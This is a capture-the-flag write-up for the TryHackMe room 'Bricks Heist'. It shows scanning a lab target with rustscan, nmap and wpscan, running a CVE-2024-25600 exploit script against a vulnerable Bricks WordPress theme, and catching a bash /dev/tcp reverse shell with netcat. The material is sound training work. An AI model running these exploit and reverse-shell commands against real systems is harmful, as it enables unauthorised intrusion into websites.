# TryHack3M: Bricks Heist

## Informations:

**IP:** 10.10.144.178
**Name:** Bricks

---

## Port Scan

**Bash:**

```
rustscan -a <IP>
```

**Output:**

```
Open 10.10.144.178:22
Open 10.10.144.178:80
Open 10.10.144.178:3306
Open 10.10.144.178:443
```

**Bash:**

```
nmap -p 22,80,443,3306 -sV -A <IP>
```

**Output:**

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3e:5c:1a:a6:1f:c2:1f:32:1d:65:21:b6:eb:e8:7d:1f (RSA)
|   256 cc:47:b2:29:07:7d:0d:14:bb:82:b1:5f:6c:ab:92:2d (ECDSA)
|_  256 76:c3:46:e2:a4:d3:aa:b9:7b:1a:0c:0b:f8:e7:5a:e5 (ED25519)
80/tcp   open  http     Python http.server 3.5 - 3.10
|_http-title: Error response
|_http-server-header: WebSockify Python/3.8.10
443/tcp  open  ssl/http Apache httpd
| tls-alpn: 
|   h2
|_  http/1.1
|_http-generator: WordPress 6.5       **HERE**
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2024-04-02T11:59:14
|_Not valid after:  2025-04-02T11:59:14
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Brick by Brick
|_http-server-header: Apache
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MySQL (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 (99%), Linux 3.2 - 4.14 (96%), Linux 4.15 - 5.19 (96%), Linux 2.6.32 - 3.10 (96%), Linux 5.4 (95%), Linux 2.6.32 - 3.5 (94%), Linux 2.6.32 - 3.13 (94%), Linux 5.0 - 5.14 (94%), Android 9 - 10 (Linux 4.9 - 4.14) (93%), Android 10 - 12 (Linux 4.14 - 4.19) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## WordPress Scan

**Bash:**

```
wpscan --url https://<IP> --disable-tls-checks
```

**Output:**

```
robots.txt found: https://10.10.144.178/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

XML-RPC seems to be enabled: https://10.10.144.178/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

WordPress theme in use: bricks
 |  - Location: https://10.10.144.178/wp-content/themes/bricks       *HERE*
 |  - Version: 1.9.5 (%80 conidence)                                 *HERE*

```

## CVE-2024–25600

```
sudo apt install python3-alive-progress
python3 CVE-2024-25600.py -u https://10.10.144.178/
```

**Output:**

```
Shell> _
```

## Reverse Shell

**Bash:**

```
rlwrap nc -lvnp <YOUR_PORT>
bash -c 'exec bash -i &>/dev/tcp/<YOUR_IP>/<YOUR_PORT> <&1'
```

**Output:**

```
listening on [any] <PORT> ...
connect to [IP] from (UNKNOWN) [10.10.144.178] 44874
bash: cannot set terminal process group (1323): Inappropriate ioctl for device
bash: no job control in this shell

apache@tryhackme:/data/www/default$ _
```






